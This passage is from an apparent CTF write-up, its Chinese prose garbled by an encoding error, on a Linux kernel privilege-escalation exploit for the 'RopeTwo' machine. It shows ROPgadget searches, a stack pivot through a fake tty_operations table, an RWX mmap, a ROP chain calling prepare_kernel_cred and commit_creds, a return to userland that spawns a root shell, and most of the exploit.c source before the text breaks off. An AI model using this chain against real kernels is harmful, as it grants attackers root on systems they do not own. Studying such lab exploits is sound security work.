<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="å †æ ˆä¸­æ¢"><a href="#å †æ ˆä¸­æ¢" class="headerlink" title="å †æ ˆä¸­æ¢"></a>å †æ ˆä¸­æ¢</h3><p>æ§åˆ¶äº†RIPï¼Œéœ€è¦è¿è¡Œä¸€äº›ä¸œè¥¿ã€‚å½“æƒ³åˆ°ä¸€ä¸ªå…¸å‹çš„ROPæ—¶ï¼Œæ ˆä¸Šæœ‰ä¸€ä¸ªè¢«è¦†ç›–çš„è¿”å›åœ°å€ï¼Œç„¶åROPå¯ä»¥åœ¨æ­¤ä¹‹åç»§ç»­ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦†ç›–æ˜¯tty_operationsç»“æ„ä½“ä¸­çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œæ‰€ä»¥ä¸èƒ½ä¸€ç›´å†™åœ¨é‚£é‡Œï¼Œå› ä¸ºé‚£ä¸æ˜¯å †æ ˆã€‚è¿™å°±å¼•å‡ºäº†<span class="exturl" data-url="aHR0cHM6Ly9mYWlsaW5nc2lsZW50bHkud29yZHByZXNzLmNvbS8yMDE4LzA0LzE3L3doYXQtaXMtYS1zdGFjay1waXZvdC8=">å †æ ˆæ¢è½´<i class="fa fa-external-link-alt"></i></span>çš„æ¦‚å¿µï¼Œå³ä½¿ç”¨ä¸€ä¸ªgadgetå°†å †æ ˆç§»åŠ¨åˆ°å·²ç»æˆ–å°†è¦å†™å…¥ropé“¾æ”»å‡»çš„æ–°åœ°å€ã€‚å¯ä»¥å°†å †æ ˆç§»åŠ¨åˆ°æ§åˆ¶çš„å†…å­˜ç©ºé—´ï¼Œå¹¶åœ¨é‚£é‡Œå»ºç«‹ä¸€ä¸ªROPé“¾ã€‚</p>
<p>å› ä¸ºåœ¨å¯»æ‰¾è´¯ç©¿æ•´ä¸ªå†…æ ¸çš„gadgetsï¼Œæ‰€ä»¥ä¼šæœ‰å¾ˆå¤šã€‚å°†ä½¿ç”¨ROPGadgetå°†å®ƒä»¬å…¨éƒ¨è½¬å‚¨åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­(è¿™å°†èŠ±è´¹ä¸€åˆ†é’Ÿ)ï¼Œç„¶åå¯ä»¥ä»é‚£é‡Œæœç´¢å®ƒã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># python3 /opt/ROPgadget/ROPgadget.py --binary vmlinux-5.0.0-38-generic &gt; gadgets </span></span><br><span class="line">root@kali<span class="comment"># wc -l gadgets </span></span><br><span class="line">811057 gadgets</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨å´©æºƒä¸­çœ‹åˆ°å¯¹close()çš„è¦†ç›–åœ¨RIPå’ŒRAXä¸­ç»“æŸã€‚å› æ­¤ï¼Œè™½ç„¶å¾ˆéš¾åœ¨å †æ ˆä¸Šå¾—åˆ°ä¸€äº›ä¸œè¥¿ï¼Œä»¥å¼¹å‡ºåˆ°RSPï¼Œä¸€ä¸ªxchg RSP, raxå°†æŠŠå †æ ˆåœ¨ä¸€ä¸ªçŸ¥é“çš„åœ°å€ã€‚è€Œä¸”ç”±äºä»£ç åœ¨å†…æ ¸ä¸­è¿è¡Œï¼Œåœ¨æ›´æ”¹æƒé™å’Œè¦†ç›–å†…å®¹æ–¹é¢æœ‰ç›¸å½“å¤§çš„çµæ´»æ€§ã€‚</p>
<p>ä½¿ç”¨grepå¯»æ‰¾xchgä¸RSPå’ŒRAXæ²¡æœ‰æ‰¾åˆ°ä»»ä½•ä¸œè¥¿ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep -E -e &#x27;xchg rsp, rax ; ret&#x27; -e &#x27;xchg rax, rsp ; ret&#x27; gadgets</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å› ä¸ºå¯ä»¥é¢„æµ‹å•è¯çš„å‰32ä½ï¼ŒEAXå’ŒESPä¹Ÿå¯ä»¥ï¼Œè¿˜æœ‰å¾ˆå¤šè¿™æ ·çš„å•è¯:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep -E -e &#x27;: xchg esp, eax ; ret&#x27; -e &#x27;: xchg eax, esp ; ret&#x27; gadgets | wc -l</span></span><br><span class="line">228</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºå°†ä½¿å®ƒæˆä¸ºå †æ ˆæŒ‡é’ˆï¼Œæ‰€ä»¥éœ€è¦gadgetsçš„åœ°å€ä½äº8ä½è¾¹ç•Œä¸Šã€‚è¿˜å¾ˆå¤š:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep -E -e &#x27;: xchg esp, eax ; ret&#x27; -e &#x27;: xchg eax, esp ; ret&#x27; gadgets | grep -E &quot;^0x[0-9a-f]&#123;15&#125;[08]&quot; | wc -l</span></span><br><span class="line">38</span><br><span class="line">root@kali<span class="comment"># grep -E -e &#x27;: xchg esp, eax ; ret&#x27; -e &#x27;: xchg eax, esp ; ret&#x27; gadgets | grep -E &quot;^0x[0-9a-f]&#123;15&#125;[08]&quot; | head</span></span><br><span class="line">0xffffffff81368c08 : xchg eax, esp ; ret 0</span><br><span class="line">0xffffffff817fccd8 : xchg eax, esp ; ret 0x166</span><br><span class="line">0xffffffff81610650 : xchg eax, esp ; ret 0x2241</span><br><span class="line">0xffffffff81076088 : xchg eax, esp ; ret 0x35e9</span><br><span class="line">0xffffffff81288d78 : xchg eax, esp ; ret 0x3948</span><br><span class="line">0xffffffff8114bb88 : xchg eax, esp ; ret 0x394d</span><br><span class="line">0xffffffff812f74c0 : xchg eax, esp ; ret 0x3d</span><br><span class="line">0xffffffff828deb28 : xchg eax, esp ; ret 0x43</span><br><span class="line">0xffffffff814afc90 : xchg eax, esp ; ret 0x69e9</span><br><span class="line">0xffffffff8154b090 : xchg eax, esp ; ret 0x8148</span><br></pre></td></tr></table></figure>

<p>å°†è·å–ç¬¬ä¸€ä¸ªï¼Œç°åœ¨ä»£ç çœ‹èµ·æ¥åƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// Stack Pivot</span><br><span class="line">size_t xchg_esp_eax = 0x368c08 + kernel_base;</span><br><span class="line">uint64_t *fake_tty_ops = malloc(248);</span><br><span class="line">fake_tty_ops[4] = xchg_esp_eax;</span><br><span class="line">output[0x83] = (uint64_t)fake_tty_ops;</span><br><span class="line">write_buf(<span class="built_in">id</span>, 0x420, output);</span><br><span class="line">uint64_t new_stack = xchg_esp_eax &amp; 0xffffffff;</span><br><span class="line"></span><br><span class="line">// Set Permissions</span><br><span class="line"></span><br><span class="line">// Offsets</span><br><span class="line"></span><br><span class="line">// ROP</span><br><span class="line"></span><br><span class="line">// trigger ROP</span><br><span class="line">close(ptmx);</span><br></pre></td></tr></table></figure>

<p>å¸¦æœ‰32ä½å‚æ•°çš„xchgæŒ‡ä»¤å°†0æ¸…é™¤64ä½å¯„å­˜å™¨çš„å…¶ä½™éƒ¨åˆ†ã€‚å› æ­¤ï¼Œæ–°çš„å †æ ˆä¸ä¼šåœ¨xchgæŒ‡ä»¤çš„é¡¶éƒ¨ï¼Œè€Œæ˜¯åœ¨ç›¸åŒçš„ä½ç½®ï¼Œä½†å‰32ä½ä¸ºç©ºã€‚</p>
<h3 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h3><p>åœ¨å†…æ ¸ä¸­ï¼Œæœ‰å¾ˆå¤šæ§åˆ¶æƒï¼Œä½†æ˜¯å†…å­˜éœ€è¦åŒæ—¶æ˜¯å¯å†™çš„å’Œå¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å°†è°ƒç”¨mmapã€‚è°ƒç”¨éœ€è¦åœ¨é¡µé¢è¾¹ç•Œä¸Šï¼Œå› æ­¤å°†æœ€åä¸‰ä¸ªå°å—è®¾ç½®ä¸º0ï¼Œå¹¶é€‰æ‹©ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å¤§å°ï¼Œä»¥ä¾¿ROPä¸æ‹…å¿ƒç©ºé—´é—®é¢˜ã€‚<span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9tbWFwLjIuaHRtbA==">æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span>åœ¨è¿™é‡Œæ˜¾ç¤ºäº†æ ‡è®°ï¼Œå°†é€‰æ‹©MAP_PRIVATEï¼Œå› ä¸ºå¸Œæœ›è¿™ä¸ªæ›´æ”¹åªå½±å“è¿™ä¸ªè¿›ç¨‹ï¼ŒMAP_ANONYMOUSï¼Œå› ä¸ºåœ¨è¿™é‡Œä½¿ç”¨shellcode, MAP_FIXEDï¼Œå› ä¸ºå¸Œæœ›å¼ºåˆ¶åœ°å€ã€‚å¯¹äºMAP_ANONYMOUS, fdå‚æ•°åº”è¯¥æ˜¯-1ï¼Œå¹¶ä¸”æ²¡æœ‰åç§»é‡:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Set Permissions</span><br><span class="line">mmap((void *)(new_stack &amp; <span class="number">0</span>xfffff000), <span class="number">0</span>x1000, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">    MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">// Offsets</span><br><span class="line"></span><br><span class="line">// ROP</span><br><span class="line"></span><br><span class="line">// trigger ROP</span><br><span class="line">close(ptmx);</span><br></pre></td></tr></table></figure>

<h3 id="ROP-1"><a href="#ROP-1" class="headerlink" title="ROP"></a>ROP</h3><p>ROPæœ¬èº«å°†ä½¿ç”¨ä¸€ç§æŠ€æœ¯ï¼Œå°†prepare_kernel_cred(0)ä¼ é€’ç»™commit_credsï¼Œä»¥å°†å½“å‰è¿›ç¨‹è®¾ç½®ä¸ºrootã€‚ç„¶åè¿”å›åˆ°ç”¨æˆ·ç©ºé—´ï¼Œä½¿ç”¨swapgsç”Ÿæˆshellï¼Œå¹¶ä½¿ç”¨shellç”Ÿæˆå‡½æ•°ã€‚</p>
<p>å°†å®šä¹‰éœ€è¦ä½¿ç”¨çš„åç§»é‡(æœªæ˜¾ç¤º)ï¼Œç„¶åè½¬åˆ°ROPã€‚é¦–å…ˆï¼Œå°†è¿”å›(ä½¿ç”¨ret gadgetå¼€å§‹ROPæ€»æ˜¯å¥½çš„)ï¼Œç„¶åè°ƒç”¨prepare_kernel_cred(0):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// ROP</span><br><span class="line">uint64_t *st_ptr = new_stack;</span><br><span class="line">int st_idx = 0;</span><br><span class="line">st_ptr[st_idx++] = ret;</span><br><span class="line">st_ptr[st_idx++] = pop_rdi;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = prepare_kernel_cred;</span><br></pre></td></tr></table></figure>

<p>è¿”å›æ—¶ï¼Œç»“æœå°†ä»¥RAXçš„å½¢å¼å‡ºç°ï¼Œéœ€è¦ä¸€ç§æ–¹æ³•å°†å…¶å¯¼å…¥RDIã€‚mov rdi, rdx gadgetå¹¶ä¸æ¼‚äº®:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># grep &#x27;: mov rdi, rax&#x27; gadgets | grep -v -e call -e &#x27;jmp 0x&#x27;</span></span><br><span class="line">0xffffffff8112e597 : mov rdi, rax ; cmp r8, rdx ; jne 0xffffffff8112e57c ; pop rbp ; ret</span><br><span class="line">0xffffffff814ed7ea : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed7dd ; pop rbp ; ret</span><br><span class="line">0xffffffff814ed84c : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed83d ; pop rbp ; ret</span><br><span class="line">0xffffffff8102f7ff : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret</span><br><span class="line">0xffffffff828f29f4 : mov rdi, rax ; xor eax, eax ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret</span><br><span class="line"></span><br><span class="line">root@kali<span class="comment"># grep &#x27;: pop r8 ; ret&#x27; gadgets | head -1</span></span><br><span class="line">0xffffffff814875b2 : pop r8 ; ret</span><br><span class="line">root@kali<span class="comment"># grep &#x27;: pop rdx ; ret&#x27; gadgets | head -1</span></span><br><span class="line">0xffffffff8103bbc2 : pop rdx ; ret</span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªï¼Œåªè¦R8ç­‰äºRDXï¼Œå®ƒå°±ä¼šè·³è¿‡è·³è½¬ï¼Œå¼¹å‡ºRBPï¼Œç„¶åè¿”å›ã€‚å¯ä»¥åšåˆ°:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">st_ptr[st_idx++] = pop_r8;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = pop_rdx;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br><span class="line">st_ptr[st_idx++] = commit_creds;</span><br></pre></td></tr></table></figure>

<p>ä»£ç å°†æŠŠ0æ”¾åˆ°R8å’ŒRDXä¸­ï¼Œç„¶åè°ƒç”¨gadgetå°†è¿”å›å€¼ä»RAXç§»åŠ¨åˆ°RDIï¼Œç„¶åæ˜¯RBP popçš„æœ€åä¸€ä¸ª0ã€‚ç„¶åï¼ŒRDIåŒ…å«æ¥è‡ªprepare_kernel_credçš„è¿”å›å€¼ï¼Œå®ƒè°ƒç”¨commit_credsã€‚</p>
<p>ç°åœ¨ï¼Œcredså·²ç»åˆ°ä½ï¼Œéœ€è¦ä»£ç æ¥è¿”å›ç”¨æˆ·åŒºã€‚é¦–å…ˆï¼Œswapgså°†ç”¨å®ƒåœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œæ‰€éœ€çš„å€¼äº¤æ¢å†…æ ¸çš„GSåŸºå¯„å­˜å™¨ã€‚æœ‰ä¸€ä¸ªå¸¦æœ‰swapgså’Œpop rbpçš„gadgetå¯ä»¥å·¥ä½œ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_ptr[st_idx++] = swapgs_pop_rbp;</span><br><span class="line">st_ptr[st_idx++] = 0;</span><br></pre></td></tr></table></figure>

<p>ç„¶åsysretqæŒ‡ä»¤å°†è¿”å›åˆ°uselandã€‚è¿™é€šå¸¸ç”¨äºä»<span class="exturl" data-url="aHR0cDovL3d3dy5pamFjay5vcmcudWsvc3lzY2FsbHMuaHRtbA==">ç³»ç»Ÿè°ƒç”¨è¿”å›<i class="fa fa-external-link-alt"></i></span>ã€‚éœ€è¦åœ¨RCXä¸­è®¾ç½®è¿”å›åœ°å€ï¼Œå¹¶åœ¨R11ä¸­è®¾ç½®æ ‡å¿—ã€‚å°†å†™ä¸€ä¸ªç®€çŸ­çš„å‡½æ•°ï¼Œæƒ³è·³è½¬åˆ°ä½œä¸ºroot:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void <span class="function"><span class="title">shell</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        puts(<span class="string">&quot;[-] Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>R11ä¸­çš„å†…å®¹ä¼¼ä¹å¹¶ä¸é‡è¦ï¼Œæ‰€ä»¥å°†ä½¿ç”¨0ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">st_ptr[st_idx++] = pop_rcx;</span><br><span class="line">st_ptr[st_idx++] = &amp;shell;</span><br><span class="line">st_ptr[st_idx++] = pop_r11;</span><br><span class="line">st_ptr[st_idx++] = 0x0;</span><br><span class="line">st_ptr[st_idx++] = sysretq;</span><br></pre></td></tr></table></figure>

<h3 id="è§¦å‘"><a href="#è§¦å‘" class="headerlink" title="è§¦å‘"></a>è§¦å‘</h3><p>ç°åœ¨å‰©ä¸‹è¦åšçš„å°±æ˜¯é€šè¿‡å…³é—­&#x2F;dev&#x2F;ptmx.çš„å¥æŸ„æ¥è§¦å‘ROPè¿™åº”è¯¥ä¼šå¯¼è‡´åœ¨è¿™ä¸ªè¿›ç¨‹ä¸­è¿è¡Œ&#x2F;bin&#x2F;shï¼Œä½†å¦‚æœå¤±è´¥ï¼Œå°†æ‰“å°ä¸€æ¡æ¶ˆæ¯å¹¶è¿”å›1:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// trigger ROP</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering ROP\n&quot;</span>);</span><br><span class="line">close(ptmx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Exploit failed.\n&quot;</span>);</span><br><span class="line"><span class="built_in">return</span> 1;</span><br></pre></td></tr></table></figure>

<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>å®Œæ•´çš„expæºç åœ¨è¿™é‡Œã€‚å¯¹äºæ‰€æœ‰çš„ä»£ç ç‰‡æ®µï¼Œå°†ç¼–è¯‘å¹¶ä¸Šä¼ åˆ°RopeTwoæœºå™¨:</p>
<ul>
<li>exploit.c</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"></span><br><span class="line">int fd, ptmx;</span><br><span class="line"></span><br><span class="line">struct user_data_struct &#123;</span><br><span class="line">    uint64_t <span class="built_in">id</span>;</span><br><span class="line">    uint64_t size;</span><br><span class="line">    void* data;</span><br><span class="line">&#125; user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long create_buf(uint64_t <span class="built_in">id</span>, uint64_t size)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1000, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">long delete_buf(uint64_t <span class="built_in">id</span>) &#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1001, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long write_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1002, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long read_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1003, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">shell</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        puts(<span class="string">&quot;[-] Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc) &#123;</span><br><span class="line"></span><br><span class="line">    int i, <span class="built_in">id</span>;</span><br><span class="line">    int ptmx;</span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    uint64_t kernel_base;</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = 0;</span><br><span class="line">    <span class="keyword">while</span>(kernel_base == 0) &#123;</span><br><span class="line">        // Clear buffers  </span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            delete_buf(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // Loop over buffers, create, open ptmx, check <span class="keyword">for</span> tty_struct</span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            create_buf(i, 0x400); </span><br><span class="line">            ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">            read_buf(i, 0x420, output);</span><br><span class="line">            <span class="keyword">if</span>((output[<span class="number">0</span>x80] &amp; <span class="number">0</span>xffffffff) == <span class="number">0</span>x5401 &amp;&amp;</span><br><span class="line">               (output[<span class="number">0</span>x83] &amp; <span class="number">0</span>xfff) == <span class="number">0</span>x6a0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            close(ptmx); // close if not found</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (i == <span class="number">0</span>x20)&#123;</span><br><span class="line">            printf(&quot;[-] Failed to find tty_struct. Try again.\n&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint64_t ptm_unix98_ops = output[<span class="number">0</span>x83];</span><br><span class="line">            printf(&quot;[+] Identified ptm_unix98_ops address: %<span class="number">016</span>lx\n&quot;, ptm_unix98_ops);</span><br><span class="line">            kernel_base = ptm_unix98_ops - <span class="number">0</span>x10af6a0;</span><br><span class="line">            printf(&quot;[+] Identified kernel base address:    %<span class="number">016</span>lx\n&quot;, kernel_base);</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[*] Using slot %i\n&quot;, id);</span><br><span class="line"></span><br><span class="line">    // Stack Pivot</span><br><span class="line">    size_t xchg_esp_eax = <span class="number">0</span>x368c08 + kernel_base;</span><br><span class="line">    uint64_t *fake_tty_ops = malloc(<span class="number">248</span>);</span><br><span class="line">    fake_tty_ops[<span class="number">4</span>] = xchg_esp_eax;</span><br><span class="line">    output[<span class="number">0</span>x83] = (uint64_t)fake_tty_ops;</span><br><span class="line">    write_buf(id, <span class="number">0</span>x420, output);</span><br><span class="line"></span><br><span class="line">    